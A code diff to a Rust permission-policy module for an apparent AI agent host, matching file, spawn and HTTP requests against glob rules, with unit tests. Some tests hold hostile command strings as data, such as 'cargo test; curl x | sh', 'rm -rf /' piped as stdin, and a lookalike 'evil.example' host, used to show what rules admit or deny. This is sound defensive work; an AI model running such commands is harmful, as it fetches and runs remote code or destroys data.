@@ -13,21 +13,37 @@
 //! A rule is `<kind>:<pattern>`, where the kind names what the pattern
 //! is matched against:
 //!
-//! | Kind    | Matched against                                        |
-//! |---------|--------------------------------------------------------|
-//! | `read`  | the canonical path of a file being read                |
-//! | `write` | the path of a file being created or replaced           |
-//! | `list`  | the canonical path of a directory being listed         |
-//! | `spawn` | the argv of a process being spawned, joined by spaces  |
-//! | `http`  | the full URL of an outbound request                    |
-//! | `any`   | everything; takes no pattern                           |
+//! | Kind    | Matched against                                                |
+//! |---------|----------------------------------------------------------------|
+//! | `read`  | the canonical path of a file being read                        |
+//! | `write` | the path of a file being created or replaced                   |
+//! | `list`  | the canonical path of a directory being listed                 |
+//! | `spawn` | the argv of a process being spawned, joined by spaces          |
+//! | `http`  | the method and URL of an outbound request, as `POST https://…` |
+//! | `any`   | everything; takes no pattern                                   |
 //!
 //! Patterns are globs. For the three path kinds, `*` does not cross a
-//! `/` and `**` does, and a relative pattern is rooted at the workspace
-//! — `read:**` is every file under the workspace, `read:/**` is every
-//! file anywhere, `list:.` is the workspace root itself. For `spawn`
-//! and `http` the pattern matches the whole subject and `*` matches
-//! anything — `spawn:bash -c *`, `http:https://api.anthropic.com/*`.
+//! `/`, `**` does and must be a whole path component (`**/*.rs`, never
+//! `**.rs`), a relative pattern is rooted at the workspace, and a
+//! pattern ending in `/**` also matches the directory itself — `read:**`
+//! is every file under the workspace, `read:/**` is every file
+//! anywhere, `list:**` every directory under the workspace *and* the
+//! workspace, `list:.` the workspace root alone. The host judges
+//! canonical paths, so the literal prefix of a pattern — every
+//! component before the first glob character — is canonicalised when
+//! it exists: `write:/tmp/**` means what `/tmp` resolves to.
+//!
+//! For `spawn` and `http` the pattern matches the whole subject and `*`
+//! matches anything, so it swallows what follows: `spawn:bash -c cargo
+//! *` admits any command line that starts that way, however it
+//! continues. An argv rule constrains the program and the prefix of
+//! its arguments, not what a shell does with them. A spawn that
+//! carries stdin, or runs anywhere but the workspace root, matches no
+//! `spawn` rule at all — nothing in the grammar can judge those, so
+//! only `any` admits them. An `http` pattern names the method first —
+//! `http:POST https://api.anthropic.com/*`, or `http:* https://…` for
+//! any method — because a URL that may be fetched is not one that may
+//! be posted to.
 //!
 //! A rule from a file may also name a `plugin`; it then applies only to
 //! requests from that plugin, so `write:**` can be granted to
@@ -38,12 +54,14 @@
 //! Rules are tried in the order they were given — flags in command-line
 //! order, then the policy file's rules, then the config file's — and
 //! the first that matches decides. A request no rule matches is denied,
-//! and the trace says so: there is no default that quietly allows.
+//! and the trace says so: there is no default that quietly allows. An
+//! access of a kind this frontend does not know matches no rule, `any`
+//! included, and so is denied too.
 
 use std::fmt;
 use std::path::{Path, PathBuf};
 
-use globset::{GlobBuilder, GlobMatcher};
+use globset::{Glob, GlobBuilder, GlobSet, GlobSetBuilder};
 use gwennol_core::{Access, ApprovalRequest, Decision};
 
 /// What a rule matches against.
@@ -87,19 +105,18 @@ impl Kind {
         }
     }
 
-    /// The kind an access is judged under.
-    fn of(access: &Access) -> Self {
-        match access {
+    /// The kind an access is judged under, or `None` for a kind this
+    /// frontend does not know: `Access` is non-exhaustive, and a
+    /// request no rule can describe is one no rule may admit.
+    fn of(access: &Access) -> Option<Self> {
+        Some(match access {
             Access::ReadFile(_) => Self::Read,
             Access::WriteFile(_) => Self::Write,
             Access::ListDir(_) => Self::List,
             Access::Spawn { .. } => Self::Spawn,
             Access::Http { .. } => Self::Http,
-            // `Access` is non-exhaustive: a kind this frontend does not
-            // know is one no rule of its can name, so it falls to the
-            // default and is denied.
-            _ => Self::Any,
-        }
+            _ => return None,
+        })
     }
 
     fn is_path(self) -> bool {
@@ -160,6 +177,22 @@ pub enum RuleError {
         /// The rule.
         text: String,
     },
+    /// An `http` pattern without a method: `http:<url>` would silently
+    /// match nothing, since the subject starts with the method.
+    #[error(
+        "rule {text:?}: http needs a method first, as http:POST <url-glob> (or http:* <url-glob>)"
+    )]
+    HttpWithoutMethod {
+        /// The rule.
+        text: String,
+    },
+    /// A `**` glued to other characters, which the glob engine would
+    /// quietly read as a single `*`.
+    #[error("rule {text:?}: ** must be a whole path component (write **/*.rs, not **.rs)")]
+    GluedDoubleStar {
+        /// The rule.
+        text: String,
+    },
     /// The pattern is not a glob.
     #[error("rule {text:?}: {source}")]
     Glob {
@@ -176,12 +209,16 @@ pub enum RuleError {
 pub struct Rule {
     spec: RuleSpec,
     kind: Kind,
-    matcher: Option<GlobMatcher>,
+    /// Empty for `any`. A path rule ending in `/**` compiles to two
+    /// globs, the second for the directory itself.
+    matcher: GlobSet,
 }
 
 impl Rule {
     /// Compile `spec` for a workspace rooted at `root`, which must be
-    /// absolute: relative path patterns are rooted there.
+    /// absolute and canonical: relative path patterns are rooted there,
+    /// and the literal prefix of any path pattern is canonicalised
+    /// when it exists.
     pub fn compile(spec: RuleSpec, root: &Path) -> Result<Self, RuleError> {
         let text = spec.text.clone();
         let (kind_text, pattern) = match text.split_once(':') {
@@ -192,8 +229,13 @@ impl Rule {
             text: text.clone(),
             kind: kind_text.to_string(),
         })?;
-        let matcher = match (kind, pattern) {
-            (Kind::Any, None) => None,
+        let glob_err = |source| RuleError::Glob {
+            text: text.clone(),
+            source,
+        };
+        let mut set = GlobSetBuilder::new();
+        match (kind, pattern) {
+            (Kind::Any, None) => {}
             (Kind::Any, Some(_)) => return Err(RuleError::AnyWithPattern { text }),
             (kind, None) => {
                 return Err(RuleError::MissingPattern {
@@ -202,27 +244,36 @@ impl Rule {
                 });
             }
             (kind, Some(pattern)) if kind.is_path() => {
+                if has_glued_double_star(pattern) {
+                    return Err(RuleError::GluedDoubleStar { text });
+                }
+                let path_glob = |p: &str| {
+                    GlobBuilder::new(p)
+                        .literal_separator(true)
+                        .build()
+                        .map_err(glob_err)
+                };
                 let rooted = root_pattern(pattern, root);
-                let glob = GlobBuilder::new(&rooted)
-                    .literal_separator(true)
-                    .build()
-                    .map_err(|source| RuleError::Glob {
-                        text: text.clone(),
-                        source,
-                    })?;
-                Some(glob.compile_matcher())
+                set.add(path_glob(&rooted)?);
+                // `dir/**` is everything under `dir`; the rule also
+                // admits `dir` itself, which is what a listing of the
+                // directory names.
+                if let Some(dir) = rooted.strip_suffix("/**") {
+                    let dir = if dir.is_empty() { "/" } else { dir };
+                    set.add(path_glob(dir)?);
+                }
+            }
+            (Kind::Http, Some(pattern)) => {
+                if !pattern.contains(' ') {
+                    return Err(RuleError::HttpWithoutMethod { text });
+                }
+                set.add(subject_glob(pattern).map_err(glob_err)?);
             }
             (_, Some(pattern)) => {
-                let glob = GlobBuilder::new(pattern)
-                    .literal_separator(false)
-                    .build()
-                    .map_err(|source| RuleError::Glob {
-                        text: text.clone(),
-                        source,
-                    })?;
-                Some(glob.compile_matcher())
+                set.add(subject_glob(pattern).map_err(glob_err)?);
             }
-        };
+        }
+        let matcher = set.build().map_err(glob_err)?;
         Ok(Self {
             spec,
             kind,
@@ -235,49 +286,110 @@ impl Rule {
         &self.spec
     }
 
-    fn matches(&self, request: &ApprovalRequest) -> bool {
+    fn matches(&self, request: &ApprovalRequest, root: &Path) -> bool {
         if let Some(plugin) = &self.spec.plugin
             && plugin != &request.plugin
         {
             return false;
         }
-        match self.kind {
-            Kind::Any => true,
-            kind if kind != Kind::of(&request.access) => false,
-            _ => {
-                let matcher = self.matcher.as_ref().expect("a non-any rule has a matcher");
-                match &request.access {
-                    Access::ReadFile(p) | Access::WriteFile(p) | Access::ListDir(p) => {
-                        matcher.is_match(p)
-                    }
-                    Access::Spawn { argv, .. } => matcher.is_match(argv.join(" ")),
-                    Access::Http { url, .. } => matcher.is_match(url),
-                    _ => false,
-                }
+        let Some(kind) = Kind::of(&request.access) else {
+            return false;
+        };
+        if self.kind == Kind::Any {
+            return true;
+        }
+        if self.kind != kind {
+            return false;
+        }
+        match &request.access {
+            Access::ReadFile(p) | Access::WriteFile(p) | Access::ListDir(p) => {
+                self.matcher.is_match(p)
             }
+            Access::Spawn { argv, cwd, stdin } => {
+                // Neither is expressible in a spawn rule, so neither
+                // is admitted by one.
+                if stdin.is_some() || cwd != root {
+                    return false;
+                }
+                self.matcher.is_match(argv.join(" "))
+            }
+            Access::Http { method, url } => self.matcher.is_match(format!("{method} {url}")),
+            _ => false,
         }
     }
 }
 
-/// A path pattern rooted at the workspace: an absolute pattern is
-/// itself; `.` or an empty pattern is the root exactly; anything else is
-/// joined under the root. The root's own characters are escaped so a
-/// `[` or `*` in a directory name is not read as glob syntax.
-fn root_pattern(pattern: &str, root: &Path) -> String {
-    if Path::new(pattern).is_absolute() {
-        return pattern.to_string();
-    }
-    let root = globset::escape(&root.to_string_lossy());
-    match pattern {
-        "" | "." => root,
-        _ => format!("{root}/{pattern}"),
-    }
+/// A glob over a whole subject line, `*` crossing everything.
+fn subject_glob(pattern: &str) -> Result<Glob, globset::Error> {
+    GlobBuilder::new(pattern).literal_separator(false).build()
 }
 
-/// The policy: every rule, in order.
-#[derive(Debug, Clone, Default)]
+/// Whether a `**` in `pattern` touches anything but `/` or an end.
+fn has_glued_double_star(pattern: &str) -> bool {
+    let bytes = pattern.as_bytes();
+    let mut i = 0;
+    while let Some(at) = pattern[i..].find("**") {
+        let start = i + at;
+        let end = start + 2;
+        let before_ok = start == 0 || bytes[start - 1] == b'/';
+        // A run of three or more stars is glued by construction.
+        let after_ok = end == bytes.len() || bytes[end] == b'/';
+        if !before_ok || !after_ok {
+            return true;
+        }
+        i = end;
+    }
+    false
+}
+
+/// The characters that make a path component a glob rather than a name.
+fn is_glob_component(component: &str) -> bool {
+    component.contains(['*', '?', '[', '{'])
+}
+
+/// A path pattern as the host would spell the paths it matches: rooted
+/// at the workspace when relative, and with its literal prefix — every
+/// leading component that is a plain name — canonicalised when that
+/// prefix exists, since the host shows canonical paths and `/tmp` on
+/// some systems is a link to somewhere else. The prefix is then
+/// escaped, so a `[` or `*` in a directory name is not glob syntax.
+fn root_pattern(pattern: &str, root: &Path) -> String {
+    let mut literal = if Path::new(pattern).is_absolute() {
+        PathBuf::from("/")
+    } else {
+        root.to_path_buf()
+    };
+    let mut rest = Vec::new();
+    let mut in_glob = false;
+    for component in pattern.split('/') {
+        if component.is_empty() || component == "." {
+            continue;
+        }
+        if in_glob || is_glob_component(component) {
+            in_glob = true;
+            rest.push(component);
+        } else if component == ".." {
+            literal.pop();
+        } else {
+            literal.push(component);
+        }
+    }
+    let literal = literal.canonicalize().unwrap_or(literal);
+    let mut out = globset::escape(&literal.to_string_lossy());
+    for component in rest {
+        if !out.ends_with('/') {
+            out.push('/');
+        }
+        out.push_str(component);
+    }
+    out
+}
+
+/// The policy: every rule, in order, for one workspace.
+#[derive(Debug, Clone)]
 pub struct Policy {
     rules: Vec<Rule>,
+    root: PathBuf,
 }
 
 /// A judgement on one request: the decision and the rule behind it.
@@ -290,13 +402,17 @@ pub struct Judgement<'a> {
 }
 
 impl Policy {
-    /// Compile `specs`, in order, for a workspace at `root`.
+    /// Compile `specs`, in order, for a workspace at `root` (absolute,
+    /// canonical).
     pub fn compile(specs: Vec<RuleSpec>, root: &Path) -> Result<Self, RuleError> {
         let rules = specs
             .into_iter()
             .map(|spec| Rule::compile(spec, root))
             .collect::<Result<_, _>>()?;
-        Ok(Self { rules })
+        Ok(Self {
+            rules,
+            root: root.to_path_buf(),
+        })
     }
 
     /// The rules, in the order they are tried.
@@ -306,7 +422,11 @@ impl Policy {
 
     /// Judge a request: the first matching rule, or the default denial.
     pub fn judge(&self, request: &ApprovalRequest) -> Judgement<'_> {
-        match self.rules.iter().find(|rule| rule.matches(request)) {
+        match self
+            .rules
+            .iter()
+            .find(|rule| rule.matches(request, &self.root))
+        {
             Some(rule) => Judgement {
                 decision: rule.spec.decision,
                 rule: Some(rule),
@@ -389,6 +509,10 @@ mod tests {
         request("tool-read", Access::ReadFile(PathBuf::from(path)))
     }
 
+    fn list(path: &str) -> ApprovalRequest {
+        request("tool-list", Access::ListDir(PathBuf::from(path)))
+    }
+
     fn spawn(argv: &[&str]) -> ApprovalRequest {
         request(
             "tool-bash",
@@ -400,11 +524,11 @@ mod tests {
         )
     }
 
-    fn http(url: &str) -> ApprovalRequest {
+    fn http(method: &str, url: &str) -> ApprovalRequest {
         request(
             "provider-anthropic",
             Access::Http {
-                method: "POST".into(),
+                method: method.into(),
                 url: url.into(),
             },
         )
@@ -444,16 +568,94 @@ mod tests {
     }
 
     #[test]
+    fn a_double_star_must_be_its_own_component() {
+        // globset would read `**.rs` as `*.rs` — top level only — and
+        // say nothing; the rule is refused instead.
+        let err = Rule::compile(flag(Decision::Allow, "read:**.rs"), Path::new("/ws"))
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("** must be a whole path component"), "{err}");
+        for glued in ["read:src**", "read:a/**b/c", "read:***"] {
+            assert!(
+                Rule::compile(flag(Decision::Allow, glued), Path::new("/ws")).is_err(),
+                "{glued} compiled"
+            );
+        }
+        let p = policy(vec![flag(Decision::Allow, "read:**/*.rs")]);
+        assert_eq!(p.judge(&read("/ws/main.rs")).decision, Decision::Allow);
+        assert_eq!(p.judge(&read("/ws/a/b/main.rs")).decision, Decision::Allow);
+        assert_eq!(p.judge(&read("/ws/a/b/main.c")).decision, Decision::Deny);
+    }
+
+    #[test]
+    fn a_directory_rule_admits_the_directory_itself() {
+        let p = policy(vec![
+            flag(Decision::Allow, "list:**"),
+            flag(Decision::Allow, "read:src/**"),
+        ]);
+        // `list:**` is every directory under the workspace and the
+        // workspace: listing the root is the first thing an agent does.
+        assert_eq!(p.judge(&list("/ws")).decision, Decision::Allow);
+        assert_eq!(p.judge(&list("/ws/src")).decision, Decision::Allow);
+        assert_eq!(p.judge(&list("/")).decision, Decision::Deny);
+        assert_eq!(p.judge(&read("/ws/src")).decision, Decision::Allow);
+        assert_eq!(p.judge(&read("/ws/src/a.rs")).decision, Decision::Allow);
+        assert_eq!(p.judge(&read("/ws/srcs")).decision, Decision::Deny);
+    }
+
+    #[test]
     fn absolute_patterns_and_the_root_itself() {
         let p = policy(vec![
             flag(Decision::Allow, "read:/**"),
             flag(Decision::Allow, "list:."),
         ]);
         assert_eq!(p.judge(&read("/etc/hosts")).decision, Decision::Allow);
-        let root = request("tool-list", Access::ListDir(PathBuf::from("/ws")));
-        assert_eq!(p.judge(&root).decision, Decision::Allow);
-        let sub = request("tool-list", Access::ListDir(PathBuf::from("/ws/src")));
-        assert_eq!(p.judge(&sub).decision, Decision::Deny);
+        assert_eq!(p.judge(&list("/ws")).decision, Decision::Allow);
+        assert_eq!(p.judge(&list("/ws/src")).decision, Decision::Deny);
+    }
+
+    #[test]
+    fn a_workspace_at_the_filesystem_root_still_roots_patterns() {
+        let p = Policy::compile(
+            vec![
+                flag(Decision::Allow, "read:**"),
+                flag(Decision::Allow, "list:."),
+            ],
+            Path::new("/"),
+        )
+        .unwrap();
+        assert_eq!(p.judge(&read("/etc/hosts")).decision, Decision::Allow);
+        assert_eq!(p.judge(&list("/")).decision, Decision::Allow);
+    }
+
+    #[test]
+    fn the_literal_prefix_is_canonicalised_when_it_exists() {
+        // The host shows canonical paths; a pattern through a symlink
+        // must mean where the link goes.
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path().canonicalize().unwrap();
+        std::fs::create_dir(root.join("real")).unwrap();
+        std::os::unix::fs::symlink(root.join("real"), root.join("link")).unwrap();
+        let p = Policy::compile(
+            vec![
+                flag(
+                    Decision::Allow,
+                    &format!("write:{}/link/**", root.display()),
+                ),
+                flag(Decision::Allow, "read:link/*.txt"),
+                // A prefix that does not exist is used as written.
+                flag(Decision::Allow, "read:missing/**"),
+            ],
+            &root,
+        )
+        .unwrap();
+        let real = |rest: &str| root.join("real").join(rest);
+        let write = request("tool-write", Access::WriteFile(real("out.txt")));
+        assert_eq!(p.judge(&write).decision, Decision::Allow);
+        let read_real = request("tool-read", Access::ReadFile(real("a.txt")));
+        assert_eq!(p.judge(&read_real).decision, Decision::Allow);
+        let read_missing = request("tool-read", Access::ReadFile(root.join("missing/x")));
+        assert_eq!(p.judge(&read_missing).decision, Decision::Allow);
     }
 
     #[test]
@@ -475,7 +677,7 @@ mod tests {
     }
 
     #[test]
-    fn spawn_matches_the_joined_argv_and_star_crosses_everything() {
+    fn spawn_matches_the_joined_argv_and_star_swallows_the_rest() {
         let p = policy(vec![flag(Decision::Allow, "spawn:bash -c cargo *")]);
         assert_eq!(
             p.judge(&spawn(&["bash", "-c", "cargo test --workspace"]))
@@ -488,6 +690,13 @@ mod tests {
             Decision::Allow,
             "a slash in an argument is not a separator for spawn"
         );
+        // What the module docs warn about: the star admits whatever
+        // follows the prefix, and a shell will run all of it.
+        assert_eq!(
+            p.judge(&spawn(&["bash", "-c", "cargo test; curl x | sh"]))
+                .decision,
+            Decision::Allow
+        );
         assert_eq!(
             p.judge(&spawn(&["bash", "-c", "rm -rf build"])).decision,
             Decision::Deny
@@ -496,26 +705,77 @@ mod tests {
     }
 
     #[test]
-    fn http_matches_the_whole_url() {
+    fn a_spawn_with_stdin_or_another_cwd_matches_no_spawn_rule() {
+        let p = policy(vec![flag(Decision::Allow, "spawn:*")]);
+        assert_eq!(p.judge(&spawn(&["sh"])).decision, Decision::Allow);
+        let with_stdin = request(
+            "tool-bash",
+            Access::Spawn {
+                argv: vec!["sh".into()],
+                cwd: PathBuf::from("/ws"),
+                stdin: Some("rm -rf /\n".into()),
+            },
+        );
+        assert_eq!(p.judge(&with_stdin).decision, Decision::Deny);
+        let elsewhere = request(
+            "tool-bash",
+            Access::Spawn {
+                argv: vec!["sh".into()],
+                cwd: PathBuf::from("/"),
+                stdin: None,
+            },
+        );
+        assert_eq!(p.judge(&elsewhere).decision, Decision::Deny);
+        // Only `any` reaches them.
+        let p = policy(vec![flag(Decision::Allow, "any")]);
+        assert_eq!(p.judge(&with_stdin).decision, Decision::Allow);
+        assert_eq!(p.judge(&elsewhere).decision, Decision::Allow);
+    }
+
+    #[test]
+    fn http_matches_the_method_and_the_whole_url() {
         let p = policy(vec![flag(
             Decision::Allow,
-            "http:https://api.anthropic.com/*",
+            "http:POST https://api.anthropic.com/*",
         )]);
         assert_eq!(
-            p.judge(&http("https://api.anthropic.com/v1/messages"))
+            p.judge(&http("POST", "https://api.anthropic.com/v1/messages"))
                 .decision,
             Decision::Allow
         );
         assert_eq!(
-            p.judge(&http("https://api.anthropic.com.evil.example/v1/messages"))
+            p.judge(&http("GET", "https://api.anthropic.com/v1/messages"))
                 .decision,
             Decision::Deny
         );
         assert_eq!(
-            p.judge(&http("http://api.anthropic.com/v1/messages"))
+            p.judge(&http(
+                "POST",
+                "https://api.anthropic.com.evil.example/v1/messages"
+            ))
+            .decision,
+            Decision::Deny
+        );
+        assert_eq!(
+            p.judge(&http("POST", "http://api.anthropic.com/v1/messages"))
                 .decision,
             Decision::Deny
         );
+        let any_method = policy(vec![flag(Decision::Allow, "http:* https://x.example/*")]);
+        assert_eq!(
+            any_method
+                .judge(&http("GET", "https://x.example/a"))
+                .decision,
+            Decision::Allow
+        );
+        // A pattern with no method would match nothing, silently.
+        let err = Rule::compile(
+            flag(Decision::Allow, "http:https://api.anthropic.com/*"),
+            Path::new("/ws"),
+        )
+        .unwrap_err()
+        .to_string();
+        assert!(err.contains("http needs a method first"), "{err}");
     }
 
     #[test]
@@ -563,7 +823,7 @@ mod tests {
             file(Decision::Allow, "any", Some("provider-anthropic"), 1),
             file(Decision::Allow, "spawn:*", Some("tool-bash"), 2),
         ]);
-        let j = p.judge(&http("https://api.anthropic.com/v1/messages"));
+        let j = p.judge(&http("POST", "https://api.anthropic.com/v1/messages"));
         assert_eq!(j.decision, Decision::Allow);
         assert_eq!(
             j.to_string(),
